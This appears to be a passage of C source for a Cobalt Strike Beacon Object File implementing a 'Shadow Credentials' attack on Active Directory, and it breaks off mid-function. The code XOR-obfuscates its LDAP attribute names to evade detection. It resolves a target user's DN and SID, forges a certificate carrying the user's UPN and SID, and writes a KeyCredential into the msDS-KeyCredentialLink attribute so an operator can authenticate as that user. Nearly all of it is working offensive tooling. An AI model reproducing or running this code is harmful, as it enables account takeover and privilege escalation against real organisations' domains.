static void DeobfuscateW(WCHAR* str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

/* Deobfuscate XOR'd byte string in-place */
static void DeobfuscateA(char* str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

/* Build obfuscated LDAP attribute names at runtime */
static void GetObfuscatedStrings(WCHAR* samAccountName, WCHAR* distinguishedName,
    WCHAR* objectSid, WCHAR* keyCredLink) {
    /* "sAMAccountName" XOR 0x5A */
    /* s=0x29 A=0x1B M=0x17 A=0x1B c=0x39 c=0x39 o=0x35 u=0x2F n=0x34 t=0x2E N=0x14 a=0x3B m=0x37 e=0x3F */
    WCHAR sam[] = { 0x29, 0x1B, 0x17, 0x1B, 0x39, 0x39, 0x35, 0x2F, 0x34, 0x2E,
                    0x14, 0x3B, 0x37, 0x3F, 0x00 };
    /* "distinguishedName" XOR 0x5A */
    /* d=0x3E i=0x33 s=0x29 t=0x2E i=0x33 n=0x34 g=0x3D u=0x2F i=0x33 s=0x29 h=0x32 e=0x3F d=0x3E N=0x14 a=0x3B m=0x37 e=0x3F */
    WCHAR dn[] = { 0x3E, 0x33, 0x29, 0x2E, 0x33, 0x34, 0x3D, 0x2F, 0x33, 0x29,
                   0x32, 0x3F, 0x3E, 0x14, 0x3B, 0x37, 0x3F, 0x00 };
    /* "objectSid" XOR 0x5A */
    /* o=0x35 b=0x38 j=0x30 e=0x3F c=0x39 t=0x2E S=0x09 i=0x33 d=0x3E */
    WCHAR sid[] = { 0x35, 0x38, 0x30, 0x3F, 0x39, 0x2E, 0x09, 0x33, 0x3E, 0x00 };
    /* "msDS-KeyCredentialLink" XOR 0x5A */
    /* m=0x37 s=0x29 D=0x1E S=0x09 -=0x77 K=0x11 e=0x3F y=0x23 C=0x19 r=0x28 e=0x3F d=0x3E e=0x3F n=0x34 t=0x2E i=0x33 a=0x3B l=0x36 L=0x16 i=0x33 n=0x34 k=0x31 */
    WCHAR kcl[] = { 0x37, 0x29, 0x1E, 0x09, 0x77, 0x11, 0x3F, 0x23, 0x19, 0x28,
                    0x3F, 0x3E, 0x3F, 0x34, 0x2E, 0x33, 0x3B, 0x36, 0x16, 0x33,
                    0x34, 0x31, 0x00 };

    wcscpy(samAccountName, sam);
    DeobfuscateW(samAccountName, 14);

    wcscpy(distinguishedName, dn);
    DeobfuscateW(distinguishedName, 17);

    wcscpy(objectSid, sid);
    DeobfuscateW(objectSid, 9);

    wcscpy(keyCredLink, kcl);
    DeobfuscateW(keyCredLink, 22);
}

/*
 * =============================================================================
 * LDAP Functions - Search for target and write attribute
 * =============================================================================
 */

static BOOL LookupUserDNAndSID(const char* szTarget, const char* szDomain,
    WCHAR* wszTargetDN, int dnLen, BYTE** ppSid, DWORD* pdwSidLen) {
    LDAP* pLdap = NULL;
    LDAPMessage* pResults = NULL;
    LDAPMessage* pEntry = NULL;
    struct berval** ppValues = NULL;
    WCHAR* wszDomain = NULL;
    WCHAR* wszBaseDN = NULL;
    WCHAR* wszFilter = NULL;
    WCHAR* wszTarget = NULL;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];
    WCHAR* attrs[3];

    /* Deobfuscate attribute names */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);
    attrs[0] = wszDistinguishedName;
    attrs[1] = wszObjectSid;
    attrs[2] = NULL;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;

    *ppSid = NULL;
    *pdwSidLen = 0;
    wszTargetDN[0] = L'\0';

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    wszBaseDN = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszFilter = (WCHAR*)malloc(512 * sizeof(WCHAR));
    wszTarget = (WCHAR*)malloc(256 * sizeof(WCHAR));

    if (!wszDomain || !wszBaseDN || !wszFilter || !wszTarget) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to allocate memory");
        goto cleanup;
    }

    memset(wszDomain, 0, 256 * sizeof(WCHAR));
    memset(wszBaseDN, 0, 512 * sizeof(WCHAR));
    memset(wszFilter, 0, 512 * sizeof(WCHAR));
    memset(wszTarget, 0, 256 * sizeof(WCHAR));

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);
    MultiByteToWideChar(CP_UTF8, 0, szTarget, -1, wszTarget, 256);

    /* Build base DN from domain */
    {
        WCHAR* pSrc = wszDomain;
        WCHAR* pDst = wszBaseDN;
        WCHAR* pSegStart = pSrc;
        while (*pSrc) {
            if (*pSrc == L'.') {
                wcscpy(pDst, L"DC=");
                pDst += 3;
                while (pSegStart < pSrc) *pDst++ = *pSegStart++;
                *pDst++ = L',';
                pSegStart = pSrc + 1;
            }
            pSrc++;
        }
        wcscpy(pDst, L"DC=");
        pDst += 3;
        while (*pSegStart) *pDst++ = *pSegStart++;
        *pDst = L'\0';
    }

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed");
        goto cleanup;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    /* Search by sAMAccountName (using deobfuscated string) */
    SWPRINTF(wszFilter, L"(%s=%s)", wszSamAccountName, wszTarget);
    ulResult = ldap_search_sW(pLdap, wszBaseDN, LDAP_SCOPE_SUBTREE, wszFilter, attrs, 0, &pResults);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_search_s failed: %u", ulResult);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    pEntry = ldap_first_entry(pLdap, pResults);
    if (!pEntry) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Target not found: %s (search returned 0 results)", szTarget);
        ldap_msgfree(pResults);
        ldap_unbind(pLdap);
        goto cleanup;
    }

    /* Get DN */
    PWSTR dn = ldap_get_dnW(pLdap, pEntry);
    if (dn) {
        wcscpy(wszTargetDN, dn);
        ldap_memfreeW(dn);
    }

    /* Get SID (using deobfuscated attribute name) */
    ppValues = ldap_get_values_lenW(pLdap, pEntry, wszObjectSid);
    if (ppValues && ppValues[0] && ppValues[0]->bv_len > 0) {
        if (IsValidSid((PSID)ppValues[0]->bv_val)) {
            DWORD dwSidLen = GetLengthSid((PSID)ppValues[0]->bv_val);
            *ppSid = (BYTE*)malloc(dwSidLen);
            if (*ppSid) {
                memcpy(*ppSid, ppValues[0]->bv_val, dwSidLen);
                *pdwSidLen = dwSidLen;
            }
        }
        ldap_value_free_len(ppValues);
    }

    ldap_msgfree(pResults);
    ldap_unbind(pLdap);
    bSuccess = TRUE;

cleanup:
    if (wszDomain) free(wszDomain);
    if (wszBaseDN) free(wszBaseDN);
    if (wszFilter) free(wszFilter);
    if (wszTarget) free(wszTarget);
    return bSuccess;
}

static BOOL WriteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN, BYTE* keyCredBlob, int blobLen) {
    LDAP* pLdap = NULL;
    WCHAR* wszDomain = NULL;
    LDAPModW* mods[2];
    LDAPModW mod;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];

    /* Deobfuscate attribute name */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    if (!wszDomain) return FALSE;

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_init failed for write");
        free(wszDomain);
        return FALSE;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_bind_s failed for write: %u", ulResult);
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Prepare modification - attribute is a DNWithBinary type */
    /* Format: B:<hex_length>:<hex_blob>:<DN> */
    int hexLen = blobLen * 2;
    WCHAR* wszValue = (WCHAR*)malloc((32 + hexLen + wcslen(wszTargetDN) + 1) * sizeof(WCHAR));
    WCHAR* strVals[2];
    if (!wszValue) {
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Build DNWithBinary string */
    SWPRINTF(wszValue, L"B:%d:", hexLen);
    int pos = (int)wcslen(wszValue);
    int i;
    for (i = 0; i < blobLen; i++) {
        SWPRINTF(wszValue + pos + i * 2, L"%02X", keyCredBlob[i]);
    }
    wcscat(wszValue, L":");
    wcscat(wszValue, wszTargetDN);

    /* Use string values, not binary */
    strVals[0] = wszValue;
    strVals[1] = NULL;

    mod.mod_op = LDAP_MOD_ADD;
    mod.mod_type = wszKeyCredLink;  /* Use deobfuscated attribute name */
    mod.mod_vals.modv_strvals = strVals;

    mods[0] = &mod;
    mods[1] = NULL;

    ulResult = ldap_modify_sW(pLdap, wszTargetDN, mods);
    if (ulResult == LDAP_SUCCESS) {
        bSuccess = TRUE;
        /* Save the value for later cleanup */
        int valLen = (int)wcslen(wszValue) + 1;
        g_wszKeyCredValue = (WCHAR*)malloc(valLen * sizeof(WCHAR));
        if (g_wszKeyCredValue) {
            wcscpy(g_wszKeyCredValue, wszValue);
        }
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] ldap_modify_s failed: %u", ulResult);
    }

    ldap_unbind(pLdap);
    free(wszValue);
    free(wszDomain);
    return bSuccess;
}

static BOOL DeleteKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN) {
    LDAP* pLdap = NULL;
    WCHAR* wszDomain = NULL;
    LDAPModW* mods[2];
    LDAPModW mod;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];

    if (!g_wszKeyCredValue) {
        return FALSE;
    }

    /* Deobfuscate attribute name */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    if (!wszDomain) return FALSE;

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        free(wszDomain);
        return FALSE;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Use the saved value for deletion */
    WCHAR* strVals[2];
    strVals[0] = g_wszKeyCredValue;
    strVals[1] = NULL;

    mod.mod_op = LDAP_MOD_DELETE;
    mod.mod_type = wszKeyCredLink;
    mod.mod_vals.modv_strvals = strVals;

    mods[0] = &mod;
    mods[1] = NULL;

    ulResult = ldap_modify_sW(pLdap, wszTargetDN, mods);
    if (ulResult == LDAP_SUCCESS) {
        bSuccess = TRUE;
    }

    ldap_unbind(pLdap);
    free(wszDomain);
    return bSuccess;
}

static BOOL ClearKeyCredentialLink(const char* szDomain, WCHAR* wszTargetDN) {
    LDAP* pLdap = NULL;
    WCHAR* wszDomain = NULL;
    LDAPModW* mods[2];
    LDAPModW mod;
    ULONG ulResult;
    BOOL bSuccess = FALSE;
    ULONG ulOff = 0;
    WCHAR wszSamAccountName[32];
    WCHAR wszDistinguishedName[32];
    WCHAR wszObjectSid[16];
    WCHAR wszKeyCredLink[32];

    /* Deobfuscate attribute name */
    GetObfuscatedStrings(wszSamAccountName, wszDistinguishedName, wszObjectSid, wszKeyCredLink);

    wszDomain = (WCHAR*)malloc(256 * sizeof(WCHAR));
    if (!wszDomain) return FALSE;

    MultiByteToWideChar(CP_UTF8, 0, szDomain, -1, wszDomain, 256);

    pLdap = ldap_initW(wszDomain, LDAP_PORT);
    if (!pLdap) {
        free(wszDomain);
        return FALSE;
    }

    ulOff = 0;
    ldap_set_optionW(pLdap, LDAP_OPT_REFERRALS, &ulOff);

    ulResult = ldap_bind_sW(pLdap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ulResult != LDAP_SUCCESS) {
        ldap_unbind(pLdap);
        free(wszDomain);
        return FALSE;
    }

    /* Clear all values by using LDAP_MOD_REPLACE with NULL */
    WCHAR* strVals[1];
    strVals[0] = NULL;

    mod.mod_op = LDAP_MOD_REPLACE;
    mod.mod_type = wszKeyCredLink;
    mod.mod_vals.modv_strvals = strVals;

    mods[0] = &mod;
    mods[1] = NULL;

    ulResult = ldap_modify_sW(pLdap, wszTargetDN, mods);
    if (ulResult == LDAP_SUCCESS) {
        bSuccess = TRUE;
    }

    ldap_unbind(pLdap);
    free(wszDomain);
    return bSuccess;
}

/*
 * =============================================================================
 * Certificate Generation with UPN SAN
 * =============================================================================
 */

 /* Forward declaration */
static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
    const char* szUPN, const char* szSID, WCHAR* wszContainerName,
    int* certLen, int* pfxLen);

static BYTE* GenerateCertificateAndKey(const char* szCN, const char* szDomain, const char* szSID,
    BYTE** ppPublicKey, int* pPublicKeyLen,
    BYTE** ppPfx, int* pPfxLen, GUID* pDeviceId) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    WCHAR wszContainerName[64];
    BYTE* publicKey = NULL;
    BYTE* certData = NULL;
    int certLen = 0;
    char szUPN[256];

    /* Generate container name */
    CoCreateGuid(pDeviceId);
    SWPRINTF(wszContainerName, L"ShadowCred_%08X%04X", pDeviceId->Data1, pDeviceId->Data2);

    /* Create crypto context */
    if (!CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, CRYPT_NEWKEYSET)) {
        if (GetLastError() == NTE_EXISTS) {
            if (!CryptAcquireContextW(&hProv, wszContainerName, MS_ENHANCED_PROV_W, PROV_RSA_FULL, 0)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
                return NULL;
            }
        }
        else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptAcquireContextW failed: 0x%08X", GetLastError());
            return NULL;
        }
    }

    /* Generate 2048-bit RSA key */
    if (!CryptGenKey(hProv, AT_KEYEXCHANGE, (2048 << 16) | CRYPT_EXPORTABLE, &hKey)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptGenKey failed: 0x%08X", GetLastError());
        CryptReleaseContext(hProv, 0);
        return NULL;
    }

    /* Export public key in BCRYPT format */
    publicKey = ExportRSAPublicKeyBCrypt(hKey, pPublicKeyLen);
    if (!publicKey) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to export public key");
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return NULL;
    }
    *ppPublicKey = publicKey;

    /* Build UPN */
    sprintf(szUPN, "%s@%s", szCN, szDomain);

    /* Generate certificate with UPN SAN */
    certData = BuildCertificateWithKey(hProv, hKey, szCN, szUPN, szSID, wszContainerName, &certLen, pPfxLen);
    *ppPfx = certData;

    CryptDestroyKey(hKey);
    /* Don't release context - needed for certificate operations */

    return publicKey;
}

/*
 * =============================================================================
 * Certificate Building with Extensions
 * =============================================================================
 */

static BYTE* BuildCertificateWithKey(HCRYPTPROV hProv, HCRYPTKEY hKey, const char* szCN,
    const char* szUPN, const char* szSID, WCHAR* wszContainerName,
    int* certLen, int* pfxLen) {
    BYTE* pbSubject = NULL;
    DWORD cbSubject = 0;
    char szSubjectCN[256];
    BYTE* pbEncodedUPN = NULL;
    DWORD cbEncodedUPN = 0;
    CERT_OTHER_NAME otherName;
    CERT_ALT_NAME_ENTRY altNameEntries[2];
    CERT_ALT_NAME_INFO altNameInfo;
    DWORD dwAltNameCount = 1;
    BYTE* pbEncodedSAN = NULL;
    DWORD cbEncodedSAN = 0;
    CERT_EXTENSION extensions[1];
    DWORD extCount = 0;
    CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
    DWORD dwPubKeyInfoLen = 0;
    CRYPT_ALGORITHM_IDENTIFIER sigAlgo;
    BYTE* pbEncodedCert = NULL;
    DWORD cbEncodedCert = 0;
    CERT_INFO certInfo;
    SYSTEMTIME stNow, stExpire;
    HCERTSTORE hMemStore = NULL;
    PCCERT_CONTEXT pCertContext = NULL;
    CRYPT_KEY_PROV_INFO keyProvInfo;
    CRYPT_DATA_BLOB pfxBlob;
    BYTE* resultPfx = NULL;
    static WCHAR wszSidUrl[256];

    memset(altNameEntries, 0, sizeof(altNameEntries));
    memset(&altNameInfo, 0, sizeof(altNameInfo));
    memset(&certInfo, 0, sizeof(certInfo));
    memset(&keyProvInfo, 0, sizeof(keyProvInfo));
    memset(&pfxBlob, 0, sizeof(pfxBlob));
    memset(&sigAlgo, 0, sizeof(sigAlgo));

    /* Build subject DN */
    sprintf(szSubjectCN, "CN=%s", szCN);
    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, NULL, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertStrToNameA size failed");
        return NULL;
    }
    pbSubject = (BYTE*)malloc(cbSubject);
    if (!CertStrToNameA(X509_ASN_ENCODING, szSubjectCN, CERT_X500_NAME_STR, NULL, pbSubject, &cbSubject, NULL)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertStrToNameA failed");
        free(pbSubject);
        return NULL;
    }

    /* Build SAN extension with UPN */
    {
        DWORD upnLen = (DWORD)strlen(szUPN);
        DWORD totalLen = (upnLen < 128) ? (2 + upnLen) : (4 + upnLen);
        BYTE* p;

        cbEncodedUPN = totalLen;
        pbEncodedUPN = (BYTE*)malloc(cbEncodedUPN);
        p = pbEncodedUPN;
        *p++ = 0x0C;  /* UTF8String */
        if (upnLen < 128) {
            *p++ = (BYTE)upnLen;
        }
        else {
            *p++ = 0x82;
            *p++ = (BYTE)(upnLen >> 8);
            *p++ = (BYTE)(upnLen & 0xFF);
        }
        memcpy(p, szUPN, upnLen);
    }

    otherName.pszObjId = (LPSTR)szOID_NT_PRINCIPAL_NAME;
    otherName.Value.cbData = cbEncodedUPN;
    otherName.Value.pbData = pbEncodedUPN;

    altNameEntries[0].dwAltNameChoice = CERT_ALT_NAME_OTHER_NAME;
    altNameEntries[0].pOtherName = &otherName;
    dwAltNameCount = 1;

    /* Add SID URL for KB5014754 strong mapping if provided */
    if (szSID && szSID[0]) {
        char szSidUrl[256];
        sprintf(szSidUrl, "tag:microsoft.com,2022-09-14:sid:%s", szSID);
        MultiByteToWideChar(CP_UTF8, 0, szSidUrl, -1, wszSidUrl, 256);

        altNameEntries[1].dwAltNameChoice = CERT_ALT_NAME_URL;
        altNameEntries[1].pwszURL = wszSidUrl;
        dwAltNameCount = 2;
    }

    altNameInfo.cAltEntry = dwAltNameCount;
    altNameInfo.rgAltEntry = altNameEntries;

    if (!CryptEncodeObjectEx(X509_ASN_ENCODING, szOID_SUBJECT_ALT_NAME2, &altNameInfo,
        CRYPT_ENCODE_ALLOC_FLAG, NULL, &pbEncodedSAN, &cbEncodedSAN)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to encode SAN: 0x%08X", GetLastError());
        free(pbSubject);
        free(pbEncodedUPN);
        return NULL;
    }

    extensions[extCount].pszObjId = (LPSTR)szOID_SUBJECT_ALT_NAME2;
    extensions[extCount].fCritical = FALSE;
    extensions[extCount].Value.cbData = cbEncodedSAN;
    extensions[extCount].Value.pbData = pbEncodedSAN;
    extCount++;

    /* Get public key info */
    CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, NULL, &dwPubKeyInfoLen);
    pPubKeyInfo = (CERT_PUBLIC_KEY_INFO*)malloc(dwPubKeyInfoLen);
    if (!CryptExportPublicKeyInfo(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING, pPubKeyInfo, &dwPubKeyInfoLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptExportPublicKeyInfo failed");
        goto cleanup;
    }

    /* Build certificate info */
    GetSystemTime(&stNow);
    stExpire = stNow;
    stExpire.wYear += 1;

    certInfo.dwVersion = CERT_V3;
    certInfo.SerialNumber.cbData = 16;
    certInfo.SerialNumber.pbData = (BYTE*)malloc(16);
    CryptGenRandom(hProv, 16, certInfo.SerialNumber.pbData);

    sigAlgo.pszObjId = (LPSTR)szOID_RSA_SHA256RSA;
    certInfo.SignatureAlgorithm = sigAlgo;

    certInfo.Issuer.cbData = cbSubject;
    certInfo.Issuer.pbData = pbSubject;

    SystemTimeToFileTime(&stNow, &certInfo.NotBefore);
    SystemTimeToFileTime(&stExpire, &certInfo.NotAfter);

    certInfo.Subject.cbData = cbSubject;
    certInfo.Subject.pbData = pbSubject;

    certInfo.SubjectPublicKeyInfo = *pPubKeyInfo;

    certInfo.cExtension = extCount;
    certInfo.rgExtension = extensions;

    /* Sign and encode certificate */
    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
        NULL, NULL, &cbEncodedCert)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate size failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    pbEncodedCert = (BYTE*)malloc(cbEncodedCert);
    if (!CryptSignAndEncodeCertificate(hProv, AT_KEYEXCHANGE, X509_ASN_ENCODING,
        X509_CERT_TO_BE_SIGNED, &certInfo, &sigAlgo,
        NULL, pbEncodedCert, &cbEncodedCert)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CryptSignAndEncodeCertificate failed: 0x%08X", GetLastError());
        goto cleanup;
    }

    *certLen = cbEncodedCert;

    /* Create memory store and add certificate */
    hMemStore = CertOpenStore(CERT_STORE_PROV_MEMORY, 0, 0, CERT_STORE_CREATE_NEW_FLAG, NULL);
    if (!hMemStore) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertOpenStore failed");
        goto cleanup;
    }

    pCertContext = CertCreateCertificateContext(X509_ASN_ENCODING, pbEncodedCert, cbEncodedCert);
    if (!pCertContext) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] CertCreateCertificateContext failed");
        goto cleanup;
    }

    /* Add cert to store first, then associate private key with the store copy */
    {
        PCCERT_CONTEXT pStoreCert = NULL;
        if (!CertAddCertificateContextToStore(hMemStore, pCertContext, CERT_STORE_ADD_ALWAYS, &pStoreCert)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CertAddCertificateContextToStore failed");
            goto cleanup;
        }

        /* Associate private key with the container name we created */
        keyProvInfo.pwszContainerName = wszContainerName;  /* Use the container name from key generation */
        keyProvInfo.pwszProvName = MS_ENHANCED_PROV_W;
        keyProvInfo.dwProvType = PROV_RSA_FULL;
        keyProvInfo.dwFlags = 0;
        keyProvInfo.cProvParam = 0;
        keyProvInfo.rgProvParam = NULL;
        keyProvInfo.dwKeySpec = AT_KEYEXCHANGE;

        if (!CertSetCertificateContextProperty(pStoreCert, CERT_KEY_PROV_INFO_PROP_ID, 0, &keyProvInfo)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] CertSetCertificateContextProperty failed: 0x%08X", GetLastError());
        }

        CertFreeCertificateContext(pStoreCert);
    }

    /* Export to PFX */
    pfxBlob.pbData = NULL;
    pfxBlob.cbData = 0;

    if (!PFXExportCertStoreEx(hMemStore, &pfxBlob, L"", NULL, EXPORT_PRIVATE_KEYS)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PFXExportCertStoreEx size failed");
        goto cleanup;
    }

    pfxBlob.pbData = (BYTE*)malloc(pfxBlob.cbData);
    if (!PFXExportCertStoreEx(hMemStore, &pfxBlob, L"", NULL, EXPORT_PRIVATE_KEYS)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PFXExportCertStoreEx failed");
        goto cleanup;
    }

    *pfxLen = pfxBlob.cbData;
    resultPfx = pfxBlob.pbData;

cleanup:
    if (certInfo.SerialNumber.pbData) free(certInfo.SerialNumber.pbData);
    if (pbSubject) free(pbSubject);
    if (pbEncodedUPN) free(pbEncodedUPN);
    if (pbEncodedSAN) LocalFree(pbEncodedSAN);
    if (pPubKeyInfo) free(pPubKeyInfo);
    if (pbEncodedCert && !resultPfx) free(pbEncodedCert);
    if (pCertContext) CertFreeCertificateContext(pCertContext);
    if (hMemStore) CertCloseStore(hMemStore, 0);
    /* Don't free keyProvInfo.pwszContainerName - it points to caller's buffer */

    return resultPfx;
}

void go(char* args, int alen)
{
    char* szTarget = NULL;
    char* szDomain = NULL;
    WCHAR wszTargetDN[512] = { 0 };
    BYTE* pbUserSID = NULL;
    DWORD dwUserSIDLen = 0;
    char szSIDString[128] = { 0 };
    BYTE* pbPublicKey = NULL;
    int nPublicKeyLen = 0;
    BYTE* pbPfx = NULL;
    int nPfxLen = 0;
    BYTE* pbKeyCredBlob = NULL;
    int nKeyCredBlobLen = 0;
    GUID deviceId;
    short bNoWrite = 0;
    short bClear = 0;
    char domainBuf[256] = {0};

    /* Parse arguments */
    datap parser;
    BeaconDataParse(&parser, args, alen);
    szTarget = BeaconDataExtract(&parser, NULL);
    szDomain = BeaconDataExtract(&parser, NULL);
    bNoWrite = BeaconDataShort(&parser);
    bClear   = BeaconDataShort(&parser);

    if (!szTarget || !szTarget[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Usage: certi_shadow --target <user> [--domain <domain>]");
        return;
    }

    /* Auto-detect domain if not provided */
    if (!szDomain || !szDomain[0]) {
        WCHAR wszDomain[256] = {0};
        DWORD dwSize = 256;
        /* ComputerNameDnsDomain = 2 */
        if (GetComputerNameExW(2, wszDomain, &dwSize) && wszDomain[0]) {
            WideCharToMultiByte(CP_UTF8, 0, wszDomain, -1, domainBuf, sizeof(domainBuf), NULL, NULL);
            szDomain = domainBuf;
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Auto-detected domain: %s", szDomain);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to auto-detect domain. Please specify --domain");
            return;
        }
    }

    if (bClear) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Clearing Shadow Credentials: %s@%s", szTarget, szDomain);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Shadow Credentials: %s@%s", szTarget, szDomain);
    }

    /* Save domain for cleanup */
    {
        int di;
        for (di = 0; di < 255 && szDomain[di]; di++) {
            g_szDomain[di] = szDomain[di];
        }
        g_szDomain[di] = '\0';
    }

    /* Initialize COM */
    CoInitializeEx(NULL, 0);

    /* Step 1: Lookup target DN and SID */
    if (!LookupUserDNAndSID(szTarget, szDomain, wszTargetDN, 512, &pbUserSID, &dwUserSIDLen)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to lookup target");
        goto cleanup;
    }

    /* Save target DN for cleanup */
    wcscpy(g_wszTargetDN, wszTargetDN);

    /* If --clear mode, just clear and exit */
    if (bClear) {
        if (ClearKeyCredentialLink(szDomain, wszTargetDN)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] msDS-KeyCredentialLink cleared successfully!");
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to clear msDS-KeyCredentialLink");
        }
        goto cleanup;
    }

    /* Convert SID to string for certificate */
    if (pbUserSID && dwUserSIDLen > 0) {
        LPSTR pszSid = NULL;
        if (ConvertSidToStringSidA((PSID)pbUserSID, &pszSid)) {
            strcpy(szSIDString, pszSid);
            LocalFree(pszSid);
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Target SID: %s", szSIDString);
        }
    }

    /* Step 2: Generate keypair and certificate */
    if (!GenerateCertificateAndKey(szTarget, szDomain, szSIDString,
        &pbPublicKey, &nPublicKeyLen,
        &pbPfx, &nPfxLen, &deviceId)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to generate certificate");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Generated RSA keypair (2048-bit)");

    /* Save device ID for display */
    memcpy(&g_deviceId, &deviceId, sizeof(GUID));

    /* Step 3: Build KeyCredential blob */
    pbKeyCredBlob = BuildKeyCredentialBlob(pbPublicKey, nPublicKeyLen, &deviceId, &nKeyCredBlobLen);
    if (!pbKeyCredBlob) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Failed to build KeyCredential blob");
        goto cleanup;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Built KeyCredential blob");

    /* Step 4: Write to msDS-KeyCredentialLink (unless --no-write) */
    if (!bNoWrite) {
        if (!WriteKeyCredentialLink(szDomain, wszTargetDN, pbKeyCredBlob, nKeyCredBlobLen)) {
